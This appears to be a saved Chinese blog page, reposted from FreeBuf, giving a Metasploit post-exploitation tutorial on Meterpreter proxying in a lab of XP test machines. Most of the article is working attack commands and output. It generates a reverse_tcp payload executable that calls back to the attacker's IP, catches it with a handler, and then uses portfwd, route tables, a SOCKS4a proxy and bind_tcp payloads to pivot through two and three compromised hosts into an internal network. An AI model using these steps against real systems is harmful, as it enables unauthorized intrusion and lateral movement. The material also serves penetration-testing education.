@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+
+<html lang="zh-cn">
+<head>
+<title>Metasploit渗透技巧：后渗透Meterpreter代理 | wonderkun's|blog</title>
+<link href="./Metasploit渗透技巧：后渗透Meterpreter代理  wonderkun'sblog/style.css" rel="stylesheet"/>
+<link href="./Metasploit渗透技巧：后渗透Meterpreter代理  wonderkun'sblog/style.opacity.css" rel="stylesheet"/>
+<link href="./Metasploit渗透技巧：后渗透Meterpreter代理  wonderkun'sblog/11" rel="profile">
+<link href="http://wonderkun.cc/index.html/xmlrpc.php" rel="pingback">
+<link href="" rel="shortcut icon" type="image/x-icon"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
+<meta content="dimpurr" name="author"/>
+<meta content="wonderkun's|blog" name="application-name"/>
+<meta charset="utf-8"/>
+<link href="./Metasploit渗透技巧：后渗透Meterpreter代理  wonderkun'sblog/index.html" rel="home"/>
+<link href="./Metasploit渗透技巧：后渗透Meterpreter代理  wonderkun'sblog/feed=rss2" rel="alternate" title="RSS 2.0" type="application/rss+xml"/>
+<link href="./Metasploit渗透技巧：后渗透Meterpreter代理  wonderkun'sblog/feed=rss" rel="alternate" title="RSS 1.0" type="application/rdf+xml"/>
+<link href="./Metasploit渗透技巧：后渗透Meterpreter代理  wonderkun'sblog/feed=atom" rel="alternate" title="ATOM 1.0" type="application/atom+xml"/>
+<!--[if lt IE 9]>
+<script src="http://wonderkun.cc/index.html/wp-content/themes/clearision/js/html5.js" type="text/javascript"></script>
+<![endif]-->
+<link href="./Metasploit渗透技巧：后渗透Meterpreter代理  wonderkun'sblog/feed=rss2&amp;p=84" rel="alternate" title="wonderkun's|blog » Metasploit渗透技巧：后渗透Meterpreter代理评论Feed" type="application/rss+xml"/>
+<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/wonderkun.cc\/index.html\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.5.9"}};
+			!function(a,b,c){function d(a){var c,d,e,f=b.createElement("canvas"),g=f.getContext&&f.getContext("2d"),h=String.fromCharCode;if(!g||!g.fillText)return!1;switch(g.textBaseline="top",g.font="600 32px Arial",a){case"flag":return g.fillText(h(55356,56806,55356,56826),0,0),f.toDataURL().length>3e3;case"diversity":return g.fillText(h(55356,57221),0,0),c=g.getImageData(16,16,1,1).data,d=c[0]+","+c[1]+","+c[2]+","+c[3],g.fillText(h(55356,57221,55356,57343),0,0),c=g.getImageData(16,16,1,1).data,e=c[0]+","+c[1]+","+c[2]+","+c[3],d!==e;case"simple":return g.fillText(h(55357,56835),0,0),0!==g.getImageData(16,16,1,1).data[0];case"unicode8":return g.fillText(h(55356,57135),0,0),0!==g.getImageData(16,16,1,1).data[0]}return!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i;for(i=Array("simple","flag","unicode8","diversity"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link href="./Metasploit渗透技巧：后渗透Meterpreter代理  wonderkun'sblog/rest_route=" rel="https://api.w.org/"/>
+<link href="http://wonderkun.cc/index.html/xmlrpc.php?rsd" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+<link href="./Metasploit渗透技巧：后渗透Meterpreter代理  wonderkun'sblog/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+<link href="./Metasploit渗透技巧：后渗透Meterpreter代理  wonderkun'sblog/p=81" rel="prev" title="国外整理的一套渗透测试资源合集"/>
+<link href="./Metasploit渗透技巧：后渗透Meterpreter代理  wonderkun'sblog/p=98" rel="next" title="PS各种光影的处理手法理论及实例解析"/>
+<meta content="WordPress 4.5.9" name="generator"/>
+<link href="./Metasploit渗透技巧：后渗透Meterpreter代理  wonderkun'sblog/p=84" rel="canonical"/>
+<link href="./Metasploit渗透技巧：后渗透Meterpreter代理  wonderkun'sblog/p=84" rel="shortlink"/>
+<link href="./Metasploit渗透技巧：后渗透Meterpreter代理  wonderkun'sblog/rest_route=%2Foembed%2F1.0%2Fembed&amp;url=http%3A%2F%2Fwonderkun.cc%2Findex.html%2F%3Fp%3D84" rel="alternate" type="application/json+oembed"/>
+<link href="./Metasploit渗透技巧：后渗透Meterpreter代理  wonderkun'sblog/rest_route=%2Foembed%2F1.0%2Fembed&amp;url=http%3A%2F%2Fwonderkun.cc%2Findex.html%2F%3Fp%3D84&amp;format=xml" rel="alternate" type="text/xml+oembed"/>
+<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+<style id="syntaxhighlighteranchor" type="text/css"></style>
+</link></link></head>
+<body class="single single-post postid-84 single-format-standard">
+<div id="page">
+<hgroup id="ctn_header">
+<div id="title">
+<h1 id="site-title"><span><a href="http://wonderkun.cc/index.html/" rel="home" title="wonderkun's|blog">wonderkun's|blog</a></span></h1>
+<h2 id="site-description">share with you!!</h2>
+</div>
+<div id="title_r">
+<a href="http://wonderkun.cc" target="_blank" title="个人页"><button class="tr_profile"></button></a>
+<a href="http://user.qzone.qq.com/729173164" target="_blank" title="QQ"><button class="tr_qqw"></button></a>
+<a href="http://github.com/wonderkun" target="_blank" title="Github"><button class="tr_github"></button></a>
+<a href="http://wonderkun.cc/index.html/?feed=rss2" target="_blank"><button id="tr_rss"></button></a>
+<a href="http://wonderkun.cc/index.html/wp-admin/" target="_blank"><button id="tr_admin"></button></a>
+<span id="tr_clear"></span>
+<form action="http://wonderkun.cc/index.html/" id="tr_s_f" method="get">
+<input id="s" name="s" placeholder="" size="10" type="text"/>
+</form>
+</div>
+<div class="clearfix"></div>
+</hgroup>
+<div id="float">
+<a href="http://wonderkun.cc/index.html/" rel="home" title="wonderkun's|blog"><img alt="wonderkun's|blog" id="logo" src="./Metasploit渗透技巧：后渗透Meterpreter代理  wonderkun'sblog/09451H922-11.jpg" title="wonderkun's|blog"/></a>
+<nav id="nav" role="navigation">
+<div class="menu-%e4%b8%bb%e8%8f%9c%e5%8d%95-container"><ul class="menu" id="menu-%e4%b8%bb%e8%8f%9c%e5%8d%95"><li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-18" id="menu-item-18"><a href="http://wonderkun.cc/index.html/?cat=1">hack_ctf</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-19" id="menu-item-19"><a href="http://wonderkun.cc/index.html/?cat=6">linux</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-20" id="menu-item-20"><a href="http://wonderkun.cc/index.html/?cat=7">代码控</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-21" id="menu-item-21"><a href="http://wonderkun.cc/index.html/?cat=8">技术宅</a></li>
+</ul></div></nav>
+<nav id="next" role="sencond_navigation">
+<div class="menu-%e8%be%85%e5%8a%a9%e8%8f%9c%e5%8d%95-container"><ul class="menu" id="menu-%e8%be%85%e5%8a%a9%e8%8f%9c%e5%8d%95"><li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-23" id="menu-item-23"><a href="http://wonderkun.cc/index.html/?cat=9">名站推荐</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-24" id="menu-item-24"><a href="http://wonderkun.cc/index.html/?cat=10">我们的故事</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-25" id="menu-item-25"><a href="http://wonderkun.cc/index.html/?cat=11">技术共享</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-26" id="menu-item-26"><a href="http://wonderkun.cc/index.html/?cat=12">资源分享</a></li>
+</ul></div></nav>
+</div>
+<div id="ctn">
+<div id="content">
+<article class="post_ctn">
+<hgroup class="post_hctn">
+<div class="post_time">
+<div class="post_t_d">03/30</div>
+<div class="post_t_u">18:36</div>
+</div>
+<div class="post_h_l">
+<span class="post_ct"><a href="http://wonderkun.cc/index.html/?cat=6" rel="category">linux</a></span>
+<h2 class="post_h"><a href="http://wonderkun.cc/index.html/?p=84">Metasploit渗透技巧：后渗透Meterpreter代理</a></h2>
+<div class="post_tag">
+<span class="post_c"><a class="wp-postviews">wonderkun 撰写</a></span>
+<span class="post_c"><a href="http://wonderkun.cc/index.html/?p=84#respond">无回复</a></span>
+<span class="post_c"></span>
+</div>
+</div>
+</hgroup>
+<div class="post_t"><p>前言</p>
+<p>Metasploit是一个免费的、可下载的渗透测试框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击测试。它本身附带数百个已知软件漏洞的专业级漏洞攻击测试工具。</p>
+<p>当H.D. Moore在2003年发布Metasploit时，计算机安全状况也被永久性地改变了。仿佛一夜之间，任何人都可以成为黑客，每个人都可以使用攻击工具来测试那些未打过补丁或者刚刚打过补丁的漏洞。</p>
+<p>正是因为Metasploit团队一直都在努力开发各种攻击测试工具，并将它们贡献给所有Metasploit用户，软件厂商再也不能推迟发布针对已公布漏洞的补丁了。</p>
+<p>本文将科普下metasploit隧道代理的使用技巧。</p>
+<p>0×00 获取meterpreter</p>
+<p>1.首先生成可执行文件</p>
+<pre class="prettyprint lang-html prettyprinted">root@kali:~# msfpayload windows/meterpreter/reverse_tcp  LHOST=192.168.101.105 LPORT=444 X &gt; meter.exe
+[!] ************************************************************************
+[!] *               The utility msfpayload is deprecated!                  *
+[!] *              It will be removed on or about 2015-06-08               *
+[!] *                   Please use msfvenom instead                        *
+[!] *  Details: https://github.com/rapid7/metasploit-framework/pull/4333   *
+[!] ************************************************************************
+Created by msfpayload (http://www.metasploit.com).
+Payload: windows/meterpreter/reverse_tcp
+ Length: 281
+Options: {"LHOST"=&gt;"192.168.101.105", "LPORT"=&gt;"444"}</pre>
+<p>2.启动msfconsole，监听反连端口</p>
+<pre class="prettyprint lang-html prettyprinted">root@kali:~# msfconsole
+[*] Starting the Metasploit Framework console.../ 
+Taking notes in notepad? Have Metasploit Pro track &amp; report
+your progress and findings -- learn more on http://rapid7.com/metasploit
+       =[ metasploit v4.11.0-2014122301 [core:4.11.0.pre.2014122301 api:1.0.0]]
++ -- --=[ 1386 exploits - 863 auxiliary - 236 post        ]
++ -- --=[ 342 payloads - 37 encoders - 8 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+msf &gt; use exploit/multi/handler 
+msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD =&gt; windows/meterpreter/reverse_tcp
+msf exploit(handler) &gt; set LHOST 0.0.0.0
+LHOST =&gt; 0.0.0.0
+msf exploit(handler) &gt; set LPORT 444
+LPORT =&gt; 444
+msf exploit(handler) &gt; show options 
+Module options (exploit/multi/handler):
+Name  Current Setting  Required  Description
+ ----  ---------------  --------  -----------
+Payload options (windows/meterpreter/reverse_tcp):
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (accepted: seh, thread, process, none)
+   LHOST     0.0.0.0          yes       The listen address
+   LPORT     444              yes       The listen port
+Exploit target:
+   Id  Name
+   --  ----
+   0   Wildcard Target
+msf exploit(handler) &gt; run 
+[*] Started reverse handler on 0.0.0.0:444 
+[*] Starting the payload handler...</pre>
+<p>3.在xp-test1执行meter.exe，attacker获得 meterperter</p>
+<pre class="prettyprint lang-html prettyprinted">msf exploit(handler) &gt; run 
+[*] Started reverse handler on 0.0.0.0:444 
+[*] Starting the payload handler...
+[*] Sending stage (770048 bytes) to 192.168.101.107
+[*] Meterpreter session 1 opened (192.168.101.105:444 -&gt; 192.168.101.107:48019) at 2015-01-11 12:49:11 +0800
+meterpreter &gt; ipconfig
+Interface  1
+============
+Name         : MS TCP Loopback interface
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 1520
+IPv4 Address : 127.0.0.1
+Interface  2
+============
+Name         : AMD PCNET Family PCI Ethernet Adapter - pencS
+Hardware MAC : 00:0c:29:ed:cf:d0
+MTU          : 1500
+IPv4 Address : 10.1.1.128
+IPv4 Netmask : 255.255.255.0</pre>
+<p>0×01 meterpreter基本隧道代理</p>
+<p>好，现在已经有一个反弹回来的权限，下面介绍meterpreter隧道代理的几种方法</p>
+<p>1.portfwd</p>
+<p>portfwd 是meterpreter提供的一种基本的端口转发。porfwd可以反弹单个端口到本地，并且监听.使用方法如下:</p>
+<pre class="prettyprint lang-html prettyprinted">meterpreter &gt; portfwd 
+0 total local port forwards.
+meterpreter &gt; portfwd  -h
+Usage: portfwd [-h] [add | delete | list | flush] [args]
+OPTIONS:
+    -L &lt;opt&gt;  The local host to listen on (optional).
+    -h        Help banner.
+    -l &lt;opt&gt;  The local port to listen on.
+    -p &lt;opt&gt;  The remote port to connect to.
+    -r &lt;opt&gt;  The remote host to connect to.</pre>
+<p>使用实例介绍：</p>
+<p>反弹10.1.1.129端口3389到本地2222并监听那么可以使用如下方法：</p>
+<pre class="prettyprint lang-html prettyprinted">meterpreter &gt; portfwd add -l 2222 -r 10.1.1.129 -p 3389
+[*] Local TCP relay created: 0.0.0.0:2222 &lt;-&gt; 10.1.1.129:3389
+meterpreter &gt; portfwd 
+0: 0.0.0.0:2222 -&gt; 10.1.1.129:3389
+1 total local port forwards.</pre>
+<p>已经转发成功，下面来验证下：</p>
+<pre class="prettyprint lang-html prettyprinted">root@kali:~# netstat -an | grep "2222"
+tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN</pre>
+<p>可以看到已经成功监听2222端口</p>
+<p>接着连接本地2222端口即可连接受害机器10.1.1.129 3389端口，如下：</p>
+<pre class="prettyprint lang-html prettyprinted">root@kali:~# rdesktop 127.1.1.0:2222</pre>
+<p><img alt="" class="lazy " data-original="http://www.evil0x.com/wp-content/uploads/2015/01/14212210266496.jpg" src="./Metasploit渗透技巧：后渗透Meterpreter代理  wonderkun'sblog/14212210266496.jpg" title="1111.jpg"/></p>
+<p>可以看到，已经成功连接到10.1.1.129 的3389端口</p>
+<p>2. pivot</p>
+<p>pivot是meterpreter最常用的一种代理，可以轻松把你的机器代理到受害者内网环境，下面介绍下pivot的搭建和使用方法</p>
+<p>使用方法route add   目标i或ip段     Netmask 要使用代理的会话，通过实例来说明：</p>
+<p>在metasploit添加一个路由表，目的是访问10.1.1.129将通过meterpreter的会话 1 来访问：</p>
+<pre class="prettyprint lang-html prettyprinted">msf exploit(handler) &gt; route add 10.1.1.129 255.255.255.255 1
+[*] Route added
+msf exploit(handler) &gt; route print 
+Active Routing Table
+====================
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   10.1.1.129         255.255.255.255    Session 1</pre>
+<p>这里如果要代理10.1.1.129/24 到session 1，则可以这么写</p>
+<pre class="prettyprint lang-html prettyprinted">route add 10.1.1.0 255.255.255.0 1</pre>
+<p>到这里pivot已经配置好了，你在msf里对10.1.1.129进行扫描(db_nmap)或者访问(psexe 模块，ssh模块等)将通过代理session 1这个会话来访问。</p>
+<p>如果想通过其他应用程序来使用这个代理怎么办呢，这时候可以借助 metasploit socks4a提供一个监听隧道供其他应用程序访问：</p>
+<p>首先使用 socks4a并且配置，监听端口</p>
+<pre class="prettyprint lang-html prettyprinted">msf exploit(handler) &gt; use auxiliary/server/socks4a 
+msf auxiliary(socks4a) &gt; show options 
+Module options (auxiliary/server/socks4a):
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The address to listen on
+   SRVPORT  1080             yes       The port to listen on.
+Auxiliary action:
+   Name   Description
+   ----   -----------
+   Proxy  
+msf auxiliary(socks4a) &gt; exploit -y
+[*] Auxiliary module execution completed
+msf auxiliary(socks4a) &gt; 
+[*] Starting the socks4a proxy server</pre>
+<p>查看监听端口</p>
+<pre class="prettyprint lang-html prettyprinted">root@kali:~# netstat -an | grep "1080"
+tcp        0      0 0.0.0.0:1080            0.0.0.0:*               LISTEN</pre>
+<p>端口已经监听，接着配置 proxychains</p>
+<pre class="prettyprint lang-html prettyprinted">root@kali:~# vim /etc/proxychains.conf
+[ProxyList]
+# add proxy here ...
+# meanwileroot@kali:~# netstat -an | grep "1080"
+tcp        0      0 0.0.0.0:1080            0.0.0.0:*               LISTEN 
+# defaults set to "tor"
+socks4  127.0.0.1 1080</pre>
+<p>配置好以后看看使用 proxychains进行代理访问，这里访问10.1.1.129 3389端口</p>
+<p><img alt="" class="lazy " data-original="http://www.evil0x.com/wp-content/uploads/2015/01/1421221055573.png" src="http://www.evil0x.com/wp-content/uploads/2015/01/1421221055573.png" title="2222.png"/></p>
+<p>可以看到已经成功访问</p>
+<p>0×02  多级代理</p>
+<p>1. 二级代理隧道</p>
+<p>上面介绍了meterpreter基础的代理方法，但是有些实际环境不能直接使用，考虑如下环境(内网机器A、B。A机器可以对外连接，但是访问控制很严格，只能访问到很少的内网机器，B机器不能对外连接，但是可以访问到很多核心服务和机器，A、B之间可以互相访问)，如果我们想通过B机器对核心服务和机器进行扫描和访问要怎么办呢？</p>
+<p>这时候我们就meterpreter的pivot组合轻松实现二级代理就可以</p>
+<p>效果示意图:attacker-&gt;xp-test1-&gt;xp-test2</p>
+<p>首先接着上面，我们已经有一个xp-test1反弹回来的meterprter了，接着我们生成一个正向的执行文件</p>
+<pre class="prettyprint lang-html prettyprinted">root@kali:~# msfpayload windows/meterpreter/bind_tcp  RHOST=0.0.0.0 RPORT=4444 X &gt; Rmeter.exe
+[!] ************************************************************************
+[!] *               The utility msfpayload is deprecated!                  *
+[!] *              It will be removed on or about 2015-06-08               *
+[!] *                   Please use msfvenom instead                        *
+[!] *  Details: https://github.com/rapid7/metasploit-framework/pull/4333   *
+[!] ************************************************************************
+Created by msfpayload (http://www.metasploit.com).
+Payload: windows/meterpreter/bind_tcp
+ Length: 285
+Options: {"RHOST"=&gt;"0.0.0.0", "RPORT"=&gt;"4444"}</pre>
+<p>生成好以后在xp-test2上面运行</p>
+<p>接着在msf里面添加路由</p>
+<pre class="prettyprint lang-html prettyprinted">msf exploit(handler) &gt; route add 10.1.1.129 255.255.255.255 2
+[*] Route added
+msf exploit(handler) &gt; route  print
+Active Routing Table
+====================
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   10.1.1.129         255.255.255.255    Session 2</pre>
+<p>连接正向 meterpreter获取权限</p>
+<pre class="prettyprint lang-html prettyprinted">msf exploit(handler) &gt; use exploit/multi/handler 
+msf exploit(handler) &gt; set PAYLOAD windows//bind_tcp
+PAYLOAD =&gt; windows/meterpreter/bind_tcp
+msf exploit(handler) &gt; set RHOST 10.1.1.129
+RHOST =&gt; 10.1.1.129
+msf exploit(handler) &gt; show options 
+Module options (exploit/multi/handler):
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+Payload options (windows/meterpreter/bind_tcp):
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (accepted: seh, thread, process, none)
+   LPORT     444              yes       The listen port
+   RHOST     10.1.1.129       no        The target address
+Exploit target:
+   Id  Name
+   --  ----
+   0   Wildcard Target
+msf exploit(handler) &gt; set LPORT 4444
+LPORT =&gt; 4444
+msf exploit(handler) &gt; show options 
+Module options (exploit/multi/handler):
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+Payload options (windows/meterpreter/bind_tcp):
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (accepted: seh, thread, process, none)
+   LPORT     4444             yes       The listen port
+   RHOST     10.1.1.129       no        The target address
+Exploit target:
+   Id  Name
+   --  ----
+   0   Wildcard Target
+msf exploit(handler) &gt; run 
+[*] Started bind handler
+[*] Starting the payload handler...
+[*] Sending stage (770048 bytes)
+[*] Meterpreter session 3 opened (192.168.101.105-192.168.101.107:0 -&gt; 10.1.1.129:4444) at 2015-01-11 13:34:37 +0800</pre>
+<p>现在已经获取到xp-test2的权限，注意这里是通过xp-test1 pivot代理</p>
+<p>下面来验证下，查看xp-test2 4444端口</p>
+<pre class="prettyprint lang-html prettyprinted">C:Documents and SettingsAdministrator&gt;netstat -an | find "4444"
+  TCP    10.1.1.129:4444        10.1.1.128:1051        ESTABLISHED</pre>
+<p>是通过xp-test1进行连接的。</p>
+<p>这时候二级代理已经搭建好了，你可以添加需要访问的ip到路由表，通过第二层的session(session 3)，就可以使用metaploit的其他模块访问或扫描了</p>
+<p>2.三级或多级代理</p>
+<p>有时候过于庞大或者复杂的内网环境，甚至需要三层或者多层代理，原理与两层相似，通过在第二层代理的基础上进行连接既可</p>
+<p>示意图：attacket-&gt;xp-test1-&gt;xp-test2-&gt;xp-test3-&gt;…..</p>
+<p>与两层代理类似，如下实现：</p>
+<pre class="prettyprint lang-html prettyprinted">msf exploit(handler) &gt; sessions -l
+Active sessions
+===============
+  Id  Type                   Information                        Connection
+  --  ----                   -----------                        ----------
+  2   meterpreter x86/win32  XP-TEST1Administrator @ XP-TEST1  192.168.101.105:444 -&gt; 192.168.101.107:51205 (10.1.1.128)
+  4   meterpreter x86/win32  XP-TEST2Administrator @ XP-TEST2  192.168.101.105-192.168.101.107:0 -&gt; 10.1.1.129:4444 (10.1.1.129)
+msf exploit(handler) &gt; route  add 10.1.1.131 4
+[-] Missing arguments to route add.
+msf exploit(handler) &gt; route  add 10.1.1.131 255.255.255.255 4
+[*] Route added
+msf exploit(handler) &gt; route print 
+Active Routing Table
+====================
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   10.1.1.129         255.255.255.255    Session 2
+   10.1.1.131         255.255.255.255    Session 4
+msf exploit(handler) &gt; set RHOST=10.1.1.131
+[-] Unknown variable
+Usage: set [option] [value]
+Set the given option to value.  If value is omitted, print the current value.
+If both are omitted, print options that are currently set.
+If run from a module context, this will set the value in the module&amp;#039;s
+datastore.  Use -g to operate on the global datastore
+msf exploit(handler) &gt; set RHOST 10.1.1.131
+RHOST =&gt; 10.1.1.131
+msf exploit(handler) &gt; show options 
+Module options (exploit/multi/handler):
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+Payload options (windows/meterpreter/bind_tcp):
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (accepted: seh, thread, process, none)
+   LPORT     4444             yes       The listen port
+   RHOST     10.1.1.131       no        The target address
+Exploit target:
+   Id  Name
+   --  ----
+   0   Wildcard Target
+msf exploit(handler) &gt; run 
+[*] Started bind handler
+[*] Starting the payload handler...
+[*] Sending stage (770048 bytes)
+[*] Meterpreter session 5 opened (192.168.101.105-_1_-192.168.101.107:0 -&gt; 10.1.1.131:4444) at 2015-01-11 13:45:53 +0800
+meterpreter &gt; background 
+[*] Backgrounding session 5...
+msf exploit(handler) &gt; sessions -l
+Active sessions
+===============
+  Id  Type                   Information                        Connection
+  --  ----                   -----------                        ----------
+  2   meterpreter x86/win32  XP-TEST1Administrator @ XP-TEST1  192.168.101.105:444 -&gt; 192.168.101.107:51205 (10.1.1.128)
+  4   meterpreter x86/win32  XP-TEST2Administrator @ XP-TEST2  192.168.101.105-192.168.101.107:0 -&gt; 10.1.1.129:4444 (10.1.1.129)
+  5   meterpreter x86/win32  XP-TEST3Administrator @ XP-TEST3  192.168.101.105-_1_-192.168.101.107:0 -&gt; 10.1.1.131:4444 (10.1.1.131)
+在xp-test3查看端口连接
+C:Documents and SettingsAdministrator&gt;netstat -an | find "4444"
+  TCP    10.1.1.131:4444        10.1.1.129:1032        ESTABLISHED
+在xp-test2查看4444端口
+C:Documents and SettingsAdministrator&gt;netstat -an | find "4444"
+  TCP    10.1.1.129:1032        10.1.1.131:4444        ESTABLISHED
+  TCP    10.1.1.129:4444        10.1.1.128:1054        ESTABLISHED
+说明已经实现三级连接，即attacker-&gt;xp-test1-&gt;xp-test2-&gt;xp-test3</pre>
+<p>0×03 总结</p>
+<p>最后,代理级数越多，带宽损耗和稳定性就会下降。渗透过程中根据实际情况自由灵活的选择和使用代理方式才能实现事半工倍的效果。</p>
+<p> </p>
+<p>版权属于: FreeBuf</p>
+<p>原文地址: http://www.freebuf.com/tools/56432.html</p>
+</div>
+<nav id="post_nav">
+<span id="p_n_l"><a href="http://wonderkun.cc/index.html/?p=81" rel="prev">← 国外整理的一套渗透测试资源合集</a></span>
+<span id="p_n_r"><a href="http://wonderkun.cc/index.html/?p=98" rel="next">PS各种光影的处理手法理论及实例解析 →</a></span>
+</nav>
+<div class="cmt" id="cmt">
+<div class="comment-respond" id="respond">
+<h3 class="comment-reply-title" id="reply-title"> <small><a href="/index.html/?p=84#respond" id="cancel-comment-reply-link" rel="nofollow" style="display:none;">撤销评论</a></small></h3> <form action="http://wonderkun.cc/index.html/wp-comments-post.php" class="comment-form" id="cmt_form" method="post">
+<p class="comment-form-comment"><textarea aria-required="true" cols="45" id="comment" name="comment" required="" rows="8"></textarea></p><div id="cmt_form_meta"><input id="author" name="author" placeholder="称呼" required="required" type="text" value=""/>
+<input id="email" name="email" placeholder="邮箱" required="required" type="email" value=""/>
+<input id="url" name="url" placeholder="站点" type="text" value=""/></div>
+<p class="form-submit"><input class="submit" id="cmt_submit" name="submit" type="submit" value="提交"/> <input id="comment_post_ID" name="comment_post_ID" type="hidden" value="84"/>
+<input id="comment_parent" name="comment_parent" type="hidden" value="0"/>
+</p><p style="display: none;"><input id="akismet_comment_nonce" name="akismet_comment_nonce" type="hidden" value="f5d1289f0f"/></p><p style="display: none;"><input id="ak_js" name="ak_js" type="hidden" value="234"/></p> </form>
+</div><!-- #respond -->
+</div>
+</article>
+</div>
+</div>
+<div id="sidebar">
+<div class="widget" id="one">
+<h2>近期评论</h2><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link">wonderkun</span>发表在《<a href="http://wonderkun.cc/index.html/?p=585#comment-783">php的随机数的安全性分析</a>》</li><li class="recentcomments"><span class="comment-author-link"><a class="url" href="http://aa" rel="external nofollow">wddee</a></span>发表在《<a href="http://wonderkun.cc/index.html/?p=585#comment-777">php的随机数的安全性分析</a>》</li><li class="recentcomments"><span class="comment-author-link">wonderkun</span>发表在《<a href="http://wonderkun.cc/index.html/?p=585#comment-774">php的随机数的安全性分析</a>》</li><li class="recentcomments"><span class="comment-author-link"><a class="url" href="http://aa" rel="external nofollow">wddee</a></span>发表在《<a href="http://wonderkun.cc/index.html/?p=585#comment-773">php的随机数的安全性分析</a>》</li><li class="recentcomments"><span class="comment-author-link"><a class="url" href="http://rxefekalasu.com" rel="external nofollow">Amberly</a></span>发表在《<a href="http://wonderkun.cc/index.html/?p=585#comment-733">php的随机数的安全性分析</a>》</li><li class="recentcomments"><span class="comment-author-link">wonderkun</span>发表在《<a href="http://wonderkun.cc/index.html/?p=585#comment-724">php的随机数的安全性分析</a>》</li></ul><h2>友情链接</h2>
+<ul class="xoxo blogroll">
+<li><a href="http://www.bendawang.site" target="_blank">Bendawang</a></li>
+<li><a href="http://www.bertramc.cn/" target="_blank">berTrAM</a></li>
+<li><a href="http://www.cnblogs.com/iamstudy/">l3m0n</a></li>
+<li><a href="http://www.ifuryst.com/" target="_blank">墨麒麟安全实验</a></li>
+<li><a href="http://xiaomange.meximas.com/" rel="me" target="_blank">老博客地址</a></li>
+</ul>
+<h2>好基友</h2>
+<ul class="xoxo blogroll">
+<li><a href="http://bear2.cn/" rel="friend colleague" target="_blank">pierre94</a></li>
+<li><a href="http://range.pw" rel="friend met colleague co-resident" target="_blank">range</a></li>
+<li><a href="http://www.yibeizifd.cc/%20%20" target="_blank">yibeizifd</a></li>
+<li><a href="http://yichin.url.ph/" rel="friend colleague" target="_blank">yichin</a></li>
+</ul>
+</div>
+<div class="widget" id="two">
+</div>
+<div class="clearfix"></div>
+</div><footer id="footer" role="contentinfo">
+<a href="http://dimpurr.com" title="Dimpurr (钉子)">Dimpurr</a>'s 
+<a href="http://blog.dimpurr.com/clearision" title="Clearision">Clearision</a><br/>
+Powered by <a href="http://wordpress.org/" title="WordPress">WordPress</a>
+<script src="./Metasploit渗透技巧：后渗透Meterpreter代理  wonderkun'sblog/script.js" type="text/javascript"></script>
+<script src="./Metasploit渗透技巧：后渗透Meterpreter代理  wonderkun'sblog/form.jsver=3.1.10" type="text/javascript"></script>
+<script src="./Metasploit渗透技巧：后渗透Meterpreter代理  wonderkun'sblog/wp-embed.min.jsver=4.5.9" type="text/javascript"></script>
+</footer>
+</div>
+</body>
+</html>
